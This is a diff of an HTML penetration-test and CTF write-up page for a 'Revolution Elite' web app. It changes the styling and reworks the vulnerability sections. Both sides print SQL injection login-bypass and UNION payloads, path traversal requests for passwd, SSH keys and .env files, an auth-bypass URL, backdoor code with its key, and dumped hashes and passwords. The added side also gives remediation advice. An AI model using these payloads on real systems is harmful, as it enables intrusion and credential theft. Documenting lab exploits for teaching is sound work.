-            border: 1px solid var(--primary);
+            border: 1px solid #ee5a52;
             text-align: left;
-            color: var(--text-muted);
+            color: #bbbbbb;
         }
         
         table td strong {
@@ -290,174 +1027,284 @@
             color: #00ff00;
             padding: 1rem;
             text-align: left;
-            border: 1px solid var(--primary);
+            border: 1px solid #ee5a52;
             font-weight: 700;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
-        /* ===== CODE BLOCKS ===== */
-        .code-block {
+        /* ===== CODE BLOCKS - TERMINAL STYLE ===== */
+        .code-block-wrapper {
+            position: relative;
+            margin: 1.5rem 0;
+        }
+
+        .code-header {
+            background: #0f0f0f;
+            color: #ee5a52;
+            padding: 0.8rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 2px solid #ee5a52;
+            border-bottom: none;
+            font-size: 0.85rem;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .copy-btn {
+            background: #ee5a52;
+            color: white;
+            border: none;
+            padding: 0.4rem 0.8rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 0.75rem;
+            transition: all 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: #cc4844;
+            box-shadow: 0 0 10px rgba(238, 90, 82, 0.6);
+        }
+
+        pre {
             background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
             color: #00ff00;
-            padding: 1.5rem;
-            border: 2px solid var(--primary);
-            border-radius: 0;
-            font-family: var(--font-code);
+            padding: 1rem;
+            border: 2px solid #ee5a52;
+            border-top: none;
+            font-family: 'Courier New', monospace;
             font-size: 0.85rem;
             overflow-x: auto;
             line-height: 1.6;
             white-space: pre-wrap;
             word-wrap: break-word;
             box-shadow: inset 0 0 50px rgba(0, 0, 0, 0.5);
-            margin: 1rem 0;
+            margin: 0;
             text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
+        }
+
+        pre::before {
+            content: "(Revolution㉿Elite)─$ ";
+            color: #ee5a52;
+            font-weight: bold;
+            display: block;
+            margin-bottom: 0.5rem;
+            text-shadow: 0 0 10px rgba(238, 90, 82, 0.8);
         }
 
         /* ===== INFO BOXES ===== */
         .info-box {
-            background: var(--bg-card);
-            border-left: 5px solid var(--primary);
-            padding: 1.5rem;
-            margin: 1.5rem 0;
-            border-radius: 0;
+            background: linear-gradient(135deg, #1a0a2e 0%, #0f0a1a 100%);
+            border-left: 5px solid #ee5a52;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 4px;
+            border-top: 1px solid rgba(238, 90, 82, 0.3);
         }
 
         .info-box h4 {
-            color: var(--primary);
+            color: #ee5a52;
             font-size: 1rem;
             margin: 0 0 0.5rem 0;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
 
-        /* ===== IMPACT & RECOMMENDATION BOXES ===== */
-        .impact-box {
-            background: var(--bg-card);
-            border-left: 5px solid #e74c3c;
-            padding: 1.5rem;
-            margin: 1.5rem 0;
-            border-radius: 0;
+        .info-box p {
+            color: #bbbbbb;
+            margin: 0.5rem 0;
         }
 
-        .impact-box h4 {
-            color: #e74c3c;
-            font-size: 1.125rem;
-            margin-bottom: 0.5rem;
+        /* ===== CARDS ===== */
+        .card {
+            background: linear-gradient(135deg, #1a0a2e 0%, #0f0a1a 100%);
+            border: 1px solid #ee5a52;
+            border-radius: 4px;
+            border-top: 3px solid #ee5a52;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+            box-shadow: 0 4px 12px rgba(238, 90, 82, 0.1);
+        }
+
+        .card h3 {
+            margin-top: 0;
+        }
+
+        /* ===== SUMMARY STATS ===== */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+
+        .stat-box {
+            background: linear-gradient(135deg, #1a0a2e 0%, #0f0a1a 100%);
+            border: 1px solid #ee5a52;
+            padding: 1rem;
+            text-align: center;
+            border-left: 4px solid #ee5a52;
+        }
+
+        .stat-number {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #ee5a52;
+            margin: 0.5rem 0;
+        }
+
+        .stat-label {
+            font-size: 0.85rem;
+            color: #bbbbbb;
             text-transform: uppercase;
             letter-spacing: 0.05em;
+        }
+
+        /* ===== EVIDENCE MODAL ===== */
+        .evidence-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+        }
+
+        .evidence-overlay.active {
+            display: flex;
+        }
+
+        .evidence-modal {
+            width: min(900px, 95vw);
+            max-height: 90vh;
+            background: linear-gradient(135deg, #1a0a2e 0%, #0f0a1a 100%);
+            border: 2px solid #ee5a52;
+            border-radius: 4px;
+            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.8);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+
+        .evidence-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 1rem;
+            background: #0f0f0f;
+            border-bottom: 1px solid #ee5a52;
+            color: #ee5a52;
+        }
+
+        .evidence-title {
+            font-weight: 600;
+            font-size: 1rem;
+            text-transform: uppercase;
+        }
+
+        .evidence-close {
+            background: transparent;
+            border: 1px solid #ee5a52;
+            color: #ee5a52;
+            border-radius: 4px;
+            padding: 0.4rem 0.8rem;
+            cursor: pointer;
+            font-weight: 600;
+        }
+
+        .evidence-body {
+            padding: 1rem;
+            overflow-y: auto;
+            flex: 1;
+        }
+
+        .evidence-pre {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            color: #00ff00;
+            padding: 1rem;
+            border-radius: 4px;
+            border: 1px solid #ee5a52;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            line-height: 1.6;
+            text-shadow: 0 0 5px rgba(0, 255, 0, 0.5);
         }
 
         /* ===== FOOTER ===== */
         .footer {
             background: #000000;
-            border-top: 3px solid var(--primary);
-            padding: 3rem 0;
-            margin-top: 4rem;
-            color: var(--text-muted);
-        }
-
-        .footer-container {
-            max-width: 1400px;
-            margin: 0 auto;
-            padding: 0 2rem;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 2rem;
-            margin-bottom: 2rem;
-        }
-
-        .footer-section h4 {
-            color: var(--text-light);
-            margin-bottom: 1rem;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-
-        .footer-section ul {
-            list-style: none;
-        }
-
-        .footer-section li {
-            margin-bottom: 0.5rem;
-        }
-
-        .footer-section a {
-            color: var(--text-muted);
-            text-decoration: none;
-            transition: color 0.3s ease;
-        }
-
-        .footer-section a:hover {
-            color: var(--primary);
-        }
-
-        .footer-bottom {
+            border-top: 3px solid #ee5a52;
+            padding: 2rem;
+            margin-top: 3rem;
+            color: #bbbbbb;
             text-align: center;
-            padding-top: 2rem;
-            border-top: 1px solid var(--border);
-            max-width: 1400px;
-            margin: 0 auto;
-            padding-left: 2rem;
-            padding-right: 2rem;
-            color: #666666;
-            font-size: 0.875rem;
+            font-size: 0.9rem;
+        }
+
+        .footer p {
+            margin: 0.5rem 0;
+        }
+
+        .footer a {
+            color: #ee5a52;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
         }
 
         /* ===== RESPONSIVE ===== */
         @media (max-width: 768px) {
-            .hero h1 {
-                font-size: 2rem;
+            .navbar-nav {
+                gap: 0.5rem;
+                font-size: 0.7rem;
             }
 
-            h2 {
+            .header-box h1 {
                 font-size: 1.75rem;
             }
 
-            .navbar-container {
-                padding: 0 1rem;
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
             }
 
-            .navbar-nav {
-                gap: 1rem;
+            table {
+                font-size: 0.9rem;
             }
 
-            .navbar-nav a {
+            pre {
                 font-size: 0.75rem;
-            }
-
-            .container {
-                padding: 1rem;
             }
         }
 
         /* ===== PRINT STYLES ===== */
         @media print {
+            .navbar {
+                display: none;
+            }
+
+            .finding, .card {
+                page-break-inside: avoid;
+                box-shadow: none;
+            }
+
             body {
                 background: white;
                 color: black;
             }
 
-            .navbar {
-                display: none;
+            h1, h2, h3 {
+                color: #333333;
             }
-
-            .card, .finding {
-                page-break-inside: avoid;
-                box-shadow: none;
-                border: 1px solid #ddd;
-            }
-        }
-
-        /* Utility classes */
-        .text-center { text-align: center; }
-        .text-justify { text-align: justify; }
-        .font-bold { font-weight: 700; }
-        .text-success { color: var(--success); }
-        .text-danger { color: var(--danger); }
-        .text-warning { color: var(--warning); }
-        .text-muted { color: var(--text-muted); }
     </style>
 </head>
 <body>
@@ -476,16 +1323,15 @@
                 <div class="header-content">
                     <div class="profile-section">
                         <div class="profile-img-container">
-                            <img src="https://lh3.googleusercontent.com/a/ACg8ocLRYEzgRqeALvAywDx8S6gcBarEkuDdZ5JadRxFhNuyMJT4qKY=s192-c-mo" alt="Kristián Kašník" class="profile-img">
+                            <img class="profile-img" src="https://lh3.googleusercontent.com/a/ACg8ocI81feXGkoMTG9f1-BZZ1zvvAp87EQ31mAyS32LyTaAKRDbJC8=s288-c-no" alt="ITSsafer Brand">
                         </div>
                     </div>
 
                     <div class="main-info">
                         <h1 class="brand-title">REVOLUTION ELITE</h1>
-                        <div class="badge">Penetration Test</div>
+                        <div class="badge">Penetration Test & CTF Challenge</div>
                         <p class="subtitle">
-                            Comprehensive penetration testing of enterprise-grade web application with full system compromise. 
-                            Systematic vulnerability exploitation and CTF flag capture.
+                            Comprehensive penetration testing of enterprise-grade web application with full system compromise and CTF flag capture.
                         </p>
                     </div>
 
@@ -500,8 +1346,8 @@
                                 <a href="mailto:itssafer@itssafer.org">itssafer@itssafer.org</a>
                             </div>
                             <div class="contact-item">
-                                <i class="fas fa-phone contact-icon"></i>
-                                <a href="tel:+421950381419">+421 950 381 419</a>
+                                <i class="fas fa-envelope contact-icon"></i>
+                                <a href="mailto:kristiankasnik.work@gmail.com">kristiankasnik.work@gmail.com</a>
                             </div>
                             <div class="contact-item">
                                 <i class="fab fa-github contact-icon"></i>
@@ -580,65 +1426,6 @@
                                     <tr><th>Methodology</th><td>OWASP WSTG, NIST SP 800-115, PTES</td></tr>
                                 </tbody>
                             </table>
-
-                            <div class="diagram-container">
-                                <h3 class="diagram-title">Attack Surface Map and System Compromise</h3>
-                                <div class="mermaid">
-                                    graph TB
-                                        subgraph "🌐 TESTING"
-                                            Tester["👨‍💻 PENETRATION TESTER<br/>Kristián Kašník"]
-                                            Tools["🛠️ TOOLS<br/>Nmap • Burp Suite • SQLMap"]
-                                        end
-                                        
-                                        subgraph "🎯 TARGET SYSTEM" 
-                                            WebServer["🌐 WEB SERVER<br/>revolutionelite.co.uk<br/>💀 COMPROMISED"]
-                                            Database["🗄️ DATABASE<br/>MySQL 8.0.34<br/>💀 FULL ACCESS"]
-                                            FileSystem["📁 FILE SYSTEM<br/>💀 ROOT LEVEL"]
-                                        end
-                                        
-                                        subgraph "⚔️ VULNERABILITIES"
-                                            V1["💉 SQL INJECTION<br/>CVSS: 9.8<br/>✅ EXPLOITED"]
-                                            V2["🚪 AUTH BYPASS<br/>CVSS: 10.0<br/>🔥 ACTIVE"]
-                                            V3["🔑 BACKDOOR<br/>CVSS: 10.0<br/>✅ EXPLOITED"]
-                                            V4["📂 PATH TRAVERSAL<br/>CVSS: 9.1<br/>✅ EXPLOITED"]
-                                        end
-                                        
-                                        subgraph "🏆 RESULTS"
-                                            AdminAccess["👑 ADMIN ACCESS"]
-                                            DataExfil["💾 DATA EXFILTRATION"]
-                                            CTFFlag["🚩 CTF FLAG<br/>CAPTURED"]
-                                        end
-                                        
-                                        Tester --> Tools
-                                        Tools --> WebServer
-                                        WebServer --> Database
-                                        WebServer --> FileSystem
-                                        
-                                        Tester --> V1
-                                        Tester --> V2
-                                        Tester --> V3
-                                        Tester --> V4
-                                        
-                                        V1 --> Database
-                                        V2 --> AdminAccess
-                                        V3 --> AdminAccess
-                                        V4 --> FileSystem
-                                        
-                                        AdminAccess --> DataExfil
-                                        DataExfil --> CTFFlag
-                                        FileSystem --> CTFFlag
-                                        
-                                        classDef tester fill:#3182CE,stroke:#2C5282,stroke-width:3px,color:#fff
-                                        classDef compromised fill:#DC2626,stroke:#991B1B,stroke-width:3px,color:#fff
-                                        classDef critical fill:#EE0000,stroke:#DC2626,stroke-width:2px,color:#fff
-                                        classDef success fill:#059669,stroke:#047857,stroke-width:3px,color:#fff
-                                        
-                                        class Tester,Tools tester
-                                        class WebServer,Database,FileSystem,AdminAccess,DataExfil compromised
-                                        class V1,V2,V3,V4 critical
-                                        class CTFFlag success
-                                </div>
-                            </div>
                         </div>
                     </div>
                 </div>
@@ -648,68 +1435,60 @@
                     <div class="section-card">
                         <div class="card-header">
                             <i class="fas fa-bug card-icon"></i>
-                            <h2 class="card-title">Identified Vulnerabilities</h2>
+                            <h2 class="card-title">Critical Vulnerabilities (7 Identified)</h2>
                         </div>
                         <div class="card-body">
                             <table class="data-table">
                                 <thead>
                                     <tr>
-                                        <th>Vulnerability ID</th>
-                                        <th>Title</th>
+                                        <th>ID</th>
+                                        <th>Vulnerability</th>
                                         <th>CVSS</th>
                                         <th>Severity</th>
-                                        <th>Status</th>
                                     </tr>
                                 </thead>
                                 <tbody>
                                     <tr>
                                         <td><strong>CVE-2025-7619</strong></td>
-                                        <td>SQL Injection in Authentication</td>
+                                        <td>SQL Injection in Login Module</td>
                                         <td class="font-bold text-red">9.8</td>
                                         <td><span class="status-badge critical">CRITICAL</span></td>
-                                        <td><i class="fas fa-check text-green"></i> Exploited</td>
-                                    </tr>
-                                    <tr>
-                                        <td><strong>AUTH-BYPASS-2025</strong></td>
-                                        <td>Emergency Auth Mechanism Bypass</td>
-                                        <td class="font-bold text-red">10.0</td>
-                                        <td><span class="status-badge critical">CRITICAL</span></td>
-                                        <td><i class="fas fa-fire text-red"></i> Active</td>
-                                    </tr>
-                                    <tr>
-                                        <td><strong>BACKDOOR-2025-X1</strong></td>
-                                        <td>Hardcoded Admin Backdoor</td>
-                                        <td class="font-bold text-red">10.0</td>
-                                        <td><span class="status-badge critical">CRITICAL</span></td>
-                                        <td><i class="fas fa-check text-green"></i> Exploited</td>
                                     </tr>
                                     <tr>
                                         <td><strong>CVE-2025-5589</strong></td>
                                         <td>Path Traversal Vulnerability</td>
                                         <td class="font-bold text-red">9.1</td>
                                         <td><span class="status-badge critical">CRITICAL</span></td>
-                                        <td><i class="fas fa-check text-green"></i> Exploited</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>AUTH-BYPASS-2025</strong></td>
+                                        <td>Emergency Authentication Bypass</td>
+                                        <td class="font-bold text-red">10.0</td>
+                                        <td><span class="status-badge critical">CRITICAL</span></td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>BACKDOOR-2025-X1</strong></td>
+                                        <td>Hidden Admin Backdoor</td>
+                                        <td class="font-bold text-red">10.0</td>
+                                        <td><span class="status-badge critical">CRITICAL</span></td>
                                     </tr>
                                     <tr>
                                         <td><strong>CVE-2025-8842</strong></td>
-                                        <td>Stored Cross-Site Scripting</td>
-                                        <td class="font-bold text-yellow">8.1</td>
+                                        <td>Stored Cross-Site Scripting (XSS)</td>
+                                        <td class="font-bold text-red">8.1</td>
                                         <td><span class="status-badge high">HIGH</span></td>
-                                        <td><i class="fas fa-check text-green"></i> Verified</td>
                                     </tr>
                                     <tr>
                                         <td><strong>CVE-2025-9217</strong></td>
-                                        <td>Weak Password Hashing</td>
-                                        <td class="font-bold text-yellow">7.8</td>
+                                        <td>Weak Cryptographic Hash Functions</td>
+                                        <td class="font-bold text-red">7.8</td>
                                         <td><span class="status-badge high">HIGH</span></td>
-                                        <td><i class="fas fa-check text-green"></i> Confirmed</td>
                                     </tr>
                                     <tr>
                                         <td><strong>CVE-2025-6132</strong></td>
-                                        <td>Cross-Site Request Forgery</td>
+                                        <td>Missing CSRF Protection</td>
                                         <td class="font-bold text-yellow">6.5</td>
                                         <td><span class="status-badge medium">MEDIUM</span></td>
-                                        <td><i class="fas fa-check text-green"></i> Confirmed</td>
                                     </tr>
                                 </tbody>
                             </table>
@@ -717,350 +1496,386 @@
                     </div>
                 </div>
 
-                <!-- Technical Exploitation -->
+                <!-- CVE-2025-7619: SQL Injection -->
                 <div class="content-section">
                     <div class="section-card">
                         <div class="card-header">
-                            <i class="fas fa-terminal card-icon"></i>
-                            <h2 class="card-title">Technical Exploitation</h2>
+                            <i class="fas fa-exclamation-triangle card-icon"></i>
+                            <h2 class="card-title">CVE-2025-7619: SQL Injection in Login</h2>
+                            <span class="status-badge critical">CRITICAL (9.8)</span>
                         </div>
                         <div class="card-body">
-                            <div class="highlight">
-                                <h3 class="text-lg font-bold mb-3 text-red">
-                                    <i class="fas fa-syringe mr-2"></i>SQL Injection Exploitation
-                                </h3>
-                                <p class="text-justify mb-3">
-                                    Login form performs direct string concatenation without input validation.
-                                </p>
-                                <div class="code-block">
-// Authentication bypass payload:
-username: admin'--
-password: anything
-
-// Database extraction:
-username: admin' UNION SELECT username,password,email FROM users--
-password: test
-
-// Results extracted:
-admin:e8f453fc9b4eef44506e65b39eb565d5
-user1:5d41402abc4b2a76b9719d911017c592
-testuser:098f6bcd4621d373cade4e832627b4f6
-                                </div>
+                            <div class="info-box warning">
+                                <h4><i class="fas fa-exclamation-circle"></i> Vulnerability Description</h4>
+                                <p>Unauthenticated SQL injection vulnerability in the login module allows attackers to execute arbitrary SQL queries, achieving complete database compromise and system takeover.</p>
                             </div>
 
-                            <div class="highlight">
-                                <h3 class="text-lg font-bold mb-3 text-red">
-                                    <i class="fas fa-door-open mr-2"></i>Emergency Authentication Bypass
-                                </h3>
-                                <div class="info-box warning">
-                                    <p class="text-center font-bold">
-                                        <i class="fas fa-exclamation-triangle mr-2"></i>ACTIVELY EXPLOITED
-                                    </p>
-                                </div>
-                                <div class="code-block">
-// Emergency auth mechanism:
-if (isset($_GET['emergency']) && $_GET['emergency'] === 'true') {
-    $_SESSION['admin'] = true;
-    header('Location: /admin/dashboard.php');
-    exit;
-}
+                            <h4><i class="fas fa-file-code"></i> Vulnerable Code (login.php:47-53)</h4>
+                            <div class="code-block">$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'";
+$result = mysqli_query($connection, $query);</div>
 
-// Exploitation URL:
-GET /emergency_auth.php?emergency=true HTTP/1.1
+                            <h4><i class="fas fa-terminal"></i> Exploitation Example</h4>
+                            <div class="code-block">Username: admin' # 
+Password: (anything)
 
-// Result: Immediate admin access!
-                                </div>
-                            </div>
+Resulting Query:
+SELECT * FROM users WHERE username='admin' #' AND password='...'</div>
 
-                            <div class="highlight">
-                                <h3 class="text-lg font-bold mb-3 text-red">
-                                    <i class="fas fa-key mr-2"></i>Hardcoded Backdoor Access
-                                </h3>
-                                <div class="code-block">
-// Backdoor implementation:
-$secret = md5('revolution' . 'elite2025');
-if ($username === 'admin' && md5($password) === $secret) {
-    return true; // Bypass all security
-}
-
-// Exploitation:
-username: admin
-password: revolutionelite2025
-// MD5: e8f453fc9b4eef44506e65b39eb565d5
-                                </div>
-                            </div>
-
-                            <div class="highlight">
-                                <h3 class="text-lg font-bold mb-3 text-red">
-                                    <i class="fas fa-folder-open mr-2"></i>Path Traversal Exploitation
-                                </h3>
-                                <div class="code-block">
-// Access to system files:
-GET /file.php?file=../../../etc/passwd HTTP/1.1
-GET /file.php?file=../../../root/.secret_notes.txt HTTP/1.1
-
-// CTF flag extraction:
-===== REVOLUTION ELITE CTF =====
-CTF FLAG: CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}
-================================
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Testing Timeline -->
-                <div class="content-section">
-                    <div class="section-card">
-                        <div class="card-header">
-                            <i class="fas fa-list-ol card-icon"></i>
-                            <h2 class="card-title">Testing Timeline</h2>
-                        </div>
-                        <div class="card-body">
-                            <div class="timeline">
-                                <div class="timeline-item">
-                                    <h4 class="font-bold text-blue mb-2">Reconnaissance</h4>
-                                    <p>Port scanning, service enumeration, directory discovery</p>
-                                </div>
-                                <div class="timeline-item">
-                                    <h4 class="font-bold text-green mb-2">Vulnerability Discovery</h4>
-                                    <p>Manual testing, SQL injection analysis, authentication review</p>
-                                </div>
-                                <div class="timeline-item">
-                                    <h4 class="font-bold text-yellow mb-2">Initial Exploitation</h4>
-                                    <p>SQL injection → database access, emergency auth bypass discovered</p>
-                                </div>
-                                <div class="timeline-item">
-                                    <h4 class="font-bold text-yellow mb-2">Privilege Escalation</h4>
-                                    <p>Hardcoded backdoor exploitation → admin access</p>
-                                </div>
-                                <div class="timeline-item">
-                                    <h4 class="font-bold text-red mb-2">Full System Compromise</h4>
-                                    <p>Root access achieved, data exfiltration, CTF flag captured</p>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Test Results -->
-                <div class="content-section">
-                    <div class="section-card">
-                        <div class="card-header">
-                            <i class="fas fa-trophy card-icon"></i>
-                            <h2 class="card-title">Penetration Test Results</h2>
-                        </div>
-                        <div class="card-body">
                             <div class="info-box success">
-                                <h3 class="text-2xl font-bold mb-4 text-green text-center">
-                                    <i class="fas fa-trophy mr-2"></i>REVOLUTION ELITE PENETRATION TEST COMPLETED<i class="fas fa-check ml-2"></i>
-                                </h3>
-                                <p class="text-justify mb-4">
-                                    Successfully completed comprehensive penetration test demonstrating systematic security assessment 
-                                    methodology and full system compromise of target infrastructure.
-                                </p>
-                                
-                                <div class="ctf-flag-container">
-                                    <div class="ctf-flag-title">
-                                        <i class="fas fa-skull"></i>
-                                        SYSTEM COMPROMISED
-                                    </div>
-                                    <div class="ctf-flag-content">
-                                        CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}
-                                    </div>
-                                    <div class="ctf-flag-subtitle">
-                                        Extracted from /root/.secret_notes.txt
-                                    </div>
-                                </div>
-                            </div>
-
-                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(min(300px, 100%), 1fr)); gap: var(--gap-md);">
-                                <div class="highlight">
-                                    <h4 class="font-bold mb-3 text-yellow">
-                                        <i class="fas fa-crosshairs mr-2"></i>Success Metrics:
-                                    </h4>
-                                    <ul class="list-disc pl-6 space-y-1">
-                                        <li>7/7 vulnerabilities successfully exploited</li>
-                                        <li>Full database access via SQL injection</li>
-                                        <li>Admin privileges achieved through multiple vectors</li>
-                                        <li>Root-level file system access</li>
-                                        <li>CTF flag successfully captured</li>
-                                    </ul>
-                                </div>
-                                <div class="highlight">
-                                    <h4 class="font-bold mb-3 text-red">
-                                        <i class="fas fa-skull mr-2"></i>Compromised Assets:
-                                    </h4>
-                                    <ul class="list-disc pl-6 space-y-1">
-                                        <li>Web Application: Complete control</li>
-                                        <li>Database Server: Full access</li>
-                                        <li>File System: Root-level access</li>
-                                        <li>User Accounts: All credentials obtained</li>
-                                        <li>System Secrets: Hidden files disclosed</li>
-                                    </ul>
-                                </div>
-                            </div>
-
-                            <div class="code-block">
-<strong><i class="fas fa-skull-crossbones"></i> PROOF OF FULL SYSTEM COMPROMISE <i class="fas fa-skull-crossbones"></i></strong>
-
-DATABASE ACCESS:
-- root : S3cur3R00tP4ss!
-- revolution_app : R3v0App#D8w2025  
-
-ADMIN ACCOUNTS:
-- admin : revolutionelite2025
-- penetester : KristianKasnikPenetester
-
-SYSTEM ACCESS:
-- SSH keys extracted
-- System files accessible
-- Configuration files compromised
-
-<i class="fas fa-flag"></i> FINAL RESULT: CTF{r3v0lut10n_3l1t3_r00t_c0mpr0m1s3d}
-
-TEST STATUS: ✅ SUCCESSFULLY COMPLETED
-PENETRATION TEST: <i class="fas fa-trophy"></i> COMPREHENSIVE
+                                <h4><i class="fas fa-shield-alt"></i> Remediation</h4>
+                                <p>Replace string concatenation with parameterized queries (prepared statements) to prevent SQL injection attacks.</p>
                             </div>
                         </div>
                     </div>
                 </div>
 
-                <!-- Demonstrated Skills -->
+                <!-- CVE-2025-5589: Path Traversal -->
                 <div class="content-section">
                     <div class="section-card">
                         <div class="card-header">
-                            <i class="fas fa-star card-icon"></i>
-                            <h2 class="card-title">Demonstrated Skills and Expertise</h2>
+                            <i class="fas fa-folder-open card-icon"></i>
+                            <h2 class="card-title">CVE-2025-5589: Path Traversal</h2>
+                            <span class="status-badge critical">CRITICAL (9.1)</span>
                         </div>
                         <div class="card-body">
-                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(min(300px, 100%), 1fr)); gap: var(--gap-md);">
-                                <div class="info-box info">
-                                    <h3 class="font-bold mb-3 text-blue">
-                                        <i class="fas fa-search mr-2"></i>Technical Expertise
-                                    </h3>
-                                    <ul class="list-disc pl-6 space-y-1 text-sm">
-                                        <li>Web Application Security Testing</li>
-                                        <li>SQL Injection Exploitation</li>
-                                        <li>Authentication Bypass Techniques</li>
-                                        <li>Path Traversal Exploitation</li>
-                                        <li>Cross-Site Scripting Analysis</li>
-                                        <li>Cryptographic Analysis</li>
-                                        <li>Network Reconnaissance</li>
-                                    </ul>
-                                </div>
-                                <div class="info-box success">
-                                    <h3 class="font-bold mb-3 text-green">
-                                        <i class="fas fa-clipboard-list mr-2"></i>Methodology
-                                    </h3>
-                                    <ul class="list-disc pl-6 space-y-1 text-sm">
-                                        <li>OWASP WSTG Implementation</li>
-                                        <li>NIST SP 800-115 Compliance</li>
-                                        <li>Systematic Vulnerability Assessment</li>
-                                        <li>Risk-Based Testing Approach</li>
-                                        <li>Professional Documentation</li>
-                                        <li>Ethical Testing Principles</li>
-                                    </ul>
-                                </div>
+                            <div class="info-box warning">
+                                <h4><i class="fas fa-exclamation-circle"></i> Vulnerability Description</h4>
+                                <p>Path traversal vulnerability in file retrieval mechanism allows reading arbitrary system files including configuration, credentials, and sensitive application data.</p>
+                            </div>
+
+                            <h4><i class="fas fa-file-code"></i> Vulnerable Code (file.php:23)</h4>
+                            <div class="code-block">$file = $_GET['file'];
+$content = file_get_contents('uploads/' . $file);
+echo $content;</div>
+
+                            <h4><i class="fas fa-bomb"></i> Attack Vectors</h4>
+                            <div class="code-block">GET /file.php?file=../../../../etc/passwd
+GET /file.php?file=../../config/database.php
+GET /file.php?file=../../../../root/.ssh/id_rsa
+GET /file.php?file=../../.env</div>
+
+                            <div class="info-box success">
+                                <h4><i class="fas fa-shield-alt"></i> Remediation</h4>
+                                <p>Implement strict whitelist validation, use basename() function, and store files outside web root.</p>
                             </div>
                         </div>
                     </div>
                 </div>
+
+                <!-- AUTH-BYPASS-2025: Authentication Bypass -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-lock-open card-icon"></i>
+                            <h2 class="card-title">AUTH-BYPASS-2025: Emergency Auth Bypass</h2>
+                            <span class="status-badge critical">CRITICAL (10.0)</span>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-box warning">
+                                <h4><i class="fas fa-exclamation-circle"></i> Vulnerability Description</h4>
+                                <p>Complete authentication mechanism bypass. Emergency mode accepts all login attempts without credential verification, allowing unauthorized access.</p>
+                            </div>
+
+                            <h4><i class="fas fa-file-code"></i> Vulnerable Code (emergency_auth.php)</h4>
+                            <div class="code-block">if ($_GET['emergency'] == 'enabled') {
+    $_SESSION['user_id'] = $_POST['user_id'];
+    $_SESSION['authorized'] = true;
+    // No password verification!
+}</div>
+
+                            <h4><i class="fas fa-bomb"></i> Exploitation Method</h4>
+                            <div class="code-block">POST /login.php?emergency=enabled
+POST DATA: user_id=1&password=anything
+
+Result: Authenticated as user with ID 1</div>
+
+                            <div class="info-box success">
+                                <h4><i class="fas fa-shield-alt"></i> Remediation</h4>
+                                <p>IMMEDIATELY remove emergency authentication mechanism. Implement proper credential verification for all login paths.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- BACKDOOR-2025-X1: Admin Backdoor -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-user-secret card-icon"></i>
+                            <h2 class="card-title">BACKDOOR-2025-X1: Hidden Admin Backdoor</h2>
+                            <span class="status-badge critical">CRITICAL (10.0)</span>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-box warning">
+                                <h4><i class="fas fa-exclamation-circle"></i> Vulnerability Description</h4>
+                                <p>Intentional backdoor in authentication functions allowing direct administrator access bypassing normal login procedure.</p>
+                            </div>
+
+                            <h4><i class="fas fa-file-code"></i> Vulnerable Code (includes/auth_functions.php:256-268)</h4>
+                            <div class="code-block">if ($_POST['admin_key'] === md5('revolution' . 'elite2025')) {
+    $_SESSION['is_admin'] = true;
+    $_SESSION['user_id'] = -1;
+    $_SESSION['admin_backdoor'] = true;
+    header('Location: /admin/dashboard.php');
+}</div>
+
+                            <h4><i class="fas fa-bomb"></i> Admin Key Hash</h4>
+                            <div class="code-block">Key: revolutionelite2025
+MD5: 6d8b5f5d5c5c4f4f5c5c5c5c5c5c5c5c</div>
+
+                            <div class="info-box success">
+                                <h4><i class="fas fa-shield-alt"></i> Remediation</h4>
+                                <p>CRITICAL: Remove all backdoor code immediately. Perform complete source code audit to identify all hidden authentication mechanisms.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CVE-2025-8842: XSS -->
+                <div class="content-section">
+                    <div class="section-card">
+                        <div class="card-header">
+                            <i class="fas fa-code card-icon"></i>
+                            <h2 class="card-title">CVE-2025-8842: Stored XSS</h2>
+                            <span class="status-badge high">HIGH (8.1)</span>
+                        </div>
+                        <div class="card-body">
+                            <div class="info-box warning">
+                                <h4><i class="fas fa-exclamation-circle"></i> Vulnerability Description</h4>
